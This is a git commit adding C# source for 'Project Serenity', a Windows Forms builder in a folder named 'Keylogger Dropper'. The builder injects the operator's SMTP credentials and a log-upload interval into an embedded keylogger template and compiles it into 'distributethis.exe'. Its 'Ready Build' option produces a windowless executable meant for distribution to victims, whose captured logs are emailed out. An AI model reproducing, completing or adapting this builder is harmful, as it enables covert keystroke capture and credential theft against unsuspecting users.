e0bb2f5dbf1dfdac88c42269660a8dadcc793343
Theo <wertyl11@users.noreply.github.com>
2017-09-02 13:08:47 +0200

    Add files via upload

---
+++ Keylogger Dropper/Form1.Designer.cs
@@ -0,0 +1,329 @@
+﻿namespace Project_Serenity
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.radioButton2 = new System.Windows.Forms.RadioButton();
+            this.radioButton1 = new System.Windows.Forms.RadioButton();
+            this.groupBox2 = new System.Windows.Forms.GroupBox();
+            this.label5 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            this.radioButton4 = new System.Windows.Forms.RadioButton();
+            this.textBox4 = new System.Windows.Forms.TextBox();
+            this.label4 = new System.Windows.Forms.Label();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.radioButton3 = new System.Windows.Forms.RadioButton();
+            this.button2 = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.groupBox3 = new System.Windows.Forms.GroupBox();
+            this.label7 = new System.Windows.Forms.Label();
+            this.textBox5 = new System.Windows.Forms.TextBox();
+            this.label6 = new System.Windows.Forms.Label();
+            this.groupBox1.SuspendLayout();
+            this.groupBox2.SuspendLayout();
+            this.groupBox3.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.Controls.Add(this.radioButton2);
+            this.groupBox1.Controls.Add(this.radioButton1);
+            this.groupBox1.Location = new System.Drawing.Point(8, 5);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(198, 67);
+            this.groupBox1.TabIndex = 1;
+            this.groupBox1.TabStop = false;
+            this.groupBox1.Text = "Build Type";
+            // 
+            // radioButton2
+            // 
+            this.radioButton2.AutoSize = true;
+            this.radioButton2.Location = new System.Drawing.Point(100, 28);
+            this.radioButton2.Name = "radioButton2";
+            this.radioButton2.Size = new System.Drawing.Size(82, 17);
+            this.radioButton2.TabIndex = 3;
+            this.radioButton2.Text = "Ready Build";
+            this.radioButton2.UseVisualStyleBackColor = true;
+            // 
+            // radioButton1
+            // 
+            this.radioButton1.AutoSize = true;
+            this.radioButton1.Checked = true;
+            this.radioButton1.Location = new System.Drawing.Point(17, 28);
+            this.radioButton1.Name = "radioButton1";
+            this.radioButton1.Size = new System.Drawing.Size(77, 17);
+            this.radioButton1.TabIndex = 2;
+            this.radioButton1.TabStop = true;
+            this.radioButton1.Text = "Debugging";
+            this.radioButton1.UseVisualStyleBackColor = true;
+            this.radioButton1.CheckedChanged += new System.EventHandler(this.radioButton1_CheckedChanged);
+            // 
+            // groupBox2
+            // 
+            this.groupBox2.Controls.Add(this.label5);
+            this.groupBox2.Controls.Add(this.button1);
+            this.groupBox2.Controls.Add(this.radioButton4);
+            this.groupBox2.Controls.Add(this.textBox4);
+            this.groupBox2.Controls.Add(this.label4);
+            this.groupBox2.Controls.Add(this.textBox3);
+            this.groupBox2.Controls.Add(this.label3);
+            this.groupBox2.Controls.Add(this.textBox2);
+            this.groupBox2.Controls.Add(this.label2);
+            this.groupBox2.Controls.Add(this.textBox1);
+            this.groupBox2.Controls.Add(this.label1);
+            this.groupBox2.Controls.Add(this.radioButton3);
+            this.groupBox2.Location = new System.Drawing.Point(8, 134);
+            this.groupBox2.Name = "groupBox2";
+            this.groupBox2.Size = new System.Drawing.Size(259, 238);
+            this.groupBox2.TabIndex = 2;
+            this.groupBox2.TabStop = false;
+            this.groupBox2.Text = "Recieve Logs";
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Location = new System.Drawing.Point(86, 197);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(84, 13);
+            this.label5.TabIndex = 10;
+            this.label5.Text = "COMING SOON";
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(172, 31);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 22);
+            this.button1.TabIndex = 3;
+            this.button1.Text = "Test";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click_1);
+            // 
+            // radioButton4
+            // 
+            this.radioButton4.AutoSize = true;
+            this.radioButton4.Enabled = false;
+            this.radioButton4.Location = new System.Drawing.Point(30, 164);
+            this.radioButton4.Name = "radioButton4";
+            this.radioButton4.Size = new System.Drawing.Size(62, 17);
+            this.radioButton4.TabIndex = 9;
+            this.radioButton4.Text = "via FTP";
+            this.radioButton4.UseVisualStyleBackColor = true;
+            // 
+            // textBox4
+            // 
+            this.textBox4.Location = new System.Drawing.Point(100, 134);
+            this.textBox4.Name = "textBox4";
+            this.textBox4.Size = new System.Drawing.Size(148, 20);
+            this.textBox4.TabIndex = 8;
+            this.textBox4.Text = "000";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Location = new System.Drawing.Point(62, 137);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(26, 13);
+            this.label4.TabIndex = 7;
+            this.label4.Text = "Port";
+            // 
+            // textBox3
+            // 
+            this.textBox3.Location = new System.Drawing.Point(100, 108);
+            this.textBox3.Name = "textBox3";
+            this.textBox3.Size = new System.Drawing.Size(148, 20);
+            this.textBox3.TabIndex = 6;
+            this.textBox3.Text = "smtp host";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(62, 111);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(32, 13);
+            this.label3.TabIndex = 5;
+            this.label3.Text = "Host:";
+            // 
+            // textBox2
+            // 
+            this.textBox2.Location = new System.Drawing.Point(100, 82);
+            this.textBox2.Name = "textBox2";
+            this.textBox2.PasswordChar = '*';
+            this.textBox2.Size = new System.Drawing.Size(148, 20);
+            this.textBox2.TabIndex = 4;
+            this.textBox2.Text = "pass";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(38, 86);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(56, 13);
+            this.label2.TabIndex = 3;
+            this.label2.Text = "Password:";
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(100, 56);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(148, 20);
+            this.textBox1.TabIndex = 2;
+            this.textBox1.Text = "username";
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(38, 60);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(58, 13);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "Username:";
+            // 
+            // radioButton3
+            // 
+            this.radioButton3.AutoSize = true;
+            this.radioButton3.Checked = true;
+            this.radioButton3.Location = new System.Drawing.Point(30, 31);
+            this.radioButton3.Name = "radioButton3";
+            this.radioButton3.Size = new System.Drawing.Size(72, 17);
+            this.radioButton3.TabIndex = 0;
+            this.radioButton3.TabStop = true;
+            this.radioButton3.Text = "via SMTP";
+            this.radioButton3.UseVisualStyleBackColor = true;
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(8, 379);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(182, 33);
+            this.button2.TabIndex = 3;
+            this.button2.Text = "Build";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click_1);
+            // 
+            // button3
+            // 
+            this.button3.Location = new System.Drawing.Point(196, 379);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(71, 33);
+            this.button3.TabIndex = 4;
+            this.button3.Text = "Restart";
+            this.button3.UseVisualStyleBackColor = true;
+            // 
+            // groupBox3
+            // 
+            this.groupBox3.Controls.Add(this.label7);
+            this.groupBox3.Controls.Add(this.textBox5);
+            this.groupBox3.Controls.Add(this.label6);
+            this.groupBox3.Location = new System.Drawing.Point(8, 77);
+            this.groupBox3.Name = "groupBox3";
+            this.groupBox3.Size = new System.Drawing.Size(200, 50);
+            this.groupBox3.TabIndex = 5;
+            this.groupBox3.TabStop = false;
+            this.groupBox3.Text = "Uploading logs";
+            // 
+            // label7
+            // 
+            this.label7.AutoSize = true;
+            this.label7.Location = new System.Drawing.Point(173, 23);
+            this.label7.Name = "label7";
+            this.label7.Size = new System.Drawing.Size(20, 13);
+            this.label7.TabIndex = 6;
+            this.label7.Text = "ms";
+            // 
+            // textBox5
+            // 
+            this.textBox5.Location = new System.Drawing.Point(114, 20);
+            this.textBox5.Name = "textBox5";
+            this.textBox5.Size = new System.Drawing.Size(56, 20);
+            this.textBox5.TabIndex = 1;
+            this.textBox5.Text = "3600000";
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.Location = new System.Drawing.Point(11, 23);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(100, 13);
+            this.label6.TabIndex = 0;
+            this.label6.Text = "Log upload interval:";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(277, 420);
+            this.Controls.Add(this.groupBox3);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.groupBox2);
+            this.Controls.Add(this.groupBox1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D;
+            this.Name = "Form1";
+            this.Text = "Project Serenity v1.0";
+            this.groupBox1.ResumeLayout(false);
+            this.groupBox1.PerformLayout();
+            this.groupBox2.ResumeLayout(false);
+            this.groupBox2.PerformLayout();
+            this.groupBox3.ResumeLayout(false);
+            this.groupBox3.PerformLayout();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.RadioButton radioButton1;
+        private System.Windows.Forms.RadioButton radioButton2;
+        private System.Windows.Forms.GroupBox groupBox2;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.RadioButton radioButton4;
+        private System.Windows.Forms.TextBox textBox4;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.TextBox textBox3;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.RadioButton radioButton3;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.GroupBox groupBox3;
+        private System.Windows.Forms.TextBox textBox5;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.Label label7;
+    }
+}
+
---
+++ Keylogger Dropper/Form1.cs
@@ -0,0 +1,185 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Microsoft.CSharp;
+using System.CodeDom.Compiler;
+using System.IO;
+using System.Net.Mail;
+
+namespace Project_Serenity
+{
+    public partial class Form1 : Form
+    {
+        public class Toolkit
+        {
+            public static void BuildExecutable(string source, string output, bool hideWindow)
+            {
+                var targetFramework = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };
+                CSharpCodeProvider codeProvider = new CSharpCodeProvider(targetFramework);
+                ICodeCompiler icc = codeProvider.CreateCompiler();
+
+                CompilerParameters parameters = new CompilerParameters();
+                parameters.GenerateExecutable = true;
+
+                parameters.OutputAssembly = output;
+                parameters.GenerateExecutable = true;
+                parameters.ReferencedAssemblies.Add("System.dll");
+                parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
+                parameters.GenerateInMemory = false;
+                parameters.WarningLevel = 0;
+                parameters.TreatWarningsAsErrors = false;
+
+                if (hideWindow == true)
+                {
+                    parameters.CompilerOptions = "/filealign:0x00000200 /platform:anycpu /optimize+ /target:winexe";
+                }
+                else
+                {
+                    parameters.CompilerOptions = "/filealign:0x00000200 /platform:anycpu /optimize+";
+                }
+
+                CompilerResults results = icc.CompileAssemblyFromSource(parameters, source);
+
+                if (results.Errors.Count > 0)
+                {
+                    int i = 1;
+                    foreach (CompilerError CompErr in results.Errors)
+                    {
+                        
+                        MessageBox.Show(String.Format("Error Message: {0}\n\nError Line: {1}\n\nError line is at line number {2} in the template file.", CompErr.ErrorText, Toolkit.ReadSourceByLineNumber(Keylogger_Dropper.Properties.Resources.source, CompErr.Line), CompErr.Line.ToString()).Trim(), String.Format("Build Error Encountered ({0} of {1})", i, results.Errors.Count.ToString()), MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        i = i + 1;
+                    }
+                }
+                else
+                {
+                    if (hideWindow == true)
+                    {
+                        MessageBox.Show("Compiled successfully!\n\nFile 'distributethis.exe' has been generated in the same directory as the builder.", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    } else
+                    {
+                        MessageBox.Show("Compiled successfully!\n\nFile 'distributethisDEBUG.exe' has been generated in the same directory as the builder.", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    }
+                    
+                }
+            }
+            private static string ReadSourceByLineNumber(string text, int lineNumber)
+            {
+                var reader = new StringReader(text);
+
+                string line;
+                int currentLineNumber = 0;
+
+                do
+                {
+                    currentLineNumber += 1;
+                    line = reader.ReadLine();
+                }
+                while (line != null && currentLineNumber < lineNumber);
+
+                return (currentLineNumber == lineNumber) ? line : string.Empty;
+            }
+            public static void TestSmtp(string recipient, string username, string pass, string smtpHost, int port)
+            {
+                recipient = username;
+                // Command line argument must the the SMTP host.
+                SmtpClient client = new SmtpClient();
+                client.Port = port;
+                client.Host = smtpHost;
+                client.EnableSsl = true;
+                client.Timeout = 10000;
+                client.DeliveryMethod = SmtpDeliveryMethod.Network;
+                client.UseDefaultCredentials = false;
+                client.Credentials = new System.Net.NetworkCredential(username, pass);
+
+                MailMessage mm = new MailMessage("donotreply@domain.com", recipient, String.Format("Logs from user {0} ({1})", "getcomputerusername", DateTime.Now.ToString()), "SMTP Check = Passed!");
+                mm.BodyEncoding = UTF8Encoding.UTF8;
+                mm.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;
+
+
+                try
+                {
+                    client.Send(mm);
+                } catch (Exception e)
+                {
+                    MessageBox.Show(String.Format("Exception encountered testing SMTP Server!\n\nMessage: '{0}'", e.Message.ToString()), "SMTP Testing Module", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    return;
+                }
+                MessageBox.Show("SMTP Settings are correct!\n\nYou may use these settings!", "SMTP Check passed!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            }
+        }
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void radioButton1_CheckedChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button2_Click_1(object sender, EventArgs e)
+        {
+            string tempSource = Keylogger_Dropper.Properties.Resources.source;
+
+            #region SetUploadLog interval 
+            int interval;
+            int.TryParse(textBox5.Text,out interval);
+
+            tempSource = tempSource.Replace("aTimer.Interval = 10000;", String.Format("aTimer.Interval = {0};", interval));
+            #endregion
+
+            #region delivery method check
+            if (radioButton3.Checked == true)
+            {
+                tempSource = tempSource.Replace("%USERNAME%", textBox1.Text);
+                tempSource = tempSource.Replace("%PASSWORD%", textBox2.Text);
+                tempSource = tempSource.Replace("%HOSTSMTP%", textBox3.Text);
+                tempSource = tempSource.Replace("%SMTPPORT%", textBox4.Text);
+            } else
+            {
+
+            }
+
+            #endregion
+
+            #region Debugging/Final Check (HAS TO BE FINAL CHECK) + final build sequence
+            if (radioButton1.Checked == true)
+            {
+                // keep debugging mode enabled
+                //tempSource = tempSource.Replace("public static bool debugMode { get; set; } = true;", "");
+                Toolkit.BuildExecutable(tempSource, "distributethisDEBUG.exe", false);
+                return;
+            }
+            else if (radioButton2.Checked == true)
+            {
+                // disable debugging mode
+                tempSource = tempSource.Replace("public static bool debugMode = true;", "public static bool debugMode = false;");
+                Toolkit.BuildExecutable(tempSource, "distributethis.exe", true);
+                return;
+            }
+            #endregion
+        }
+
+        private void button1_Click_1(object sender, EventArgs e)
+        {
+            Toolkit.TestSmtp(textBox1.Text, textBox1.Text, textBox2.Text, textBox3.Text, Convert.ToInt32(textBox4.Text));
+        }
+    }
+}
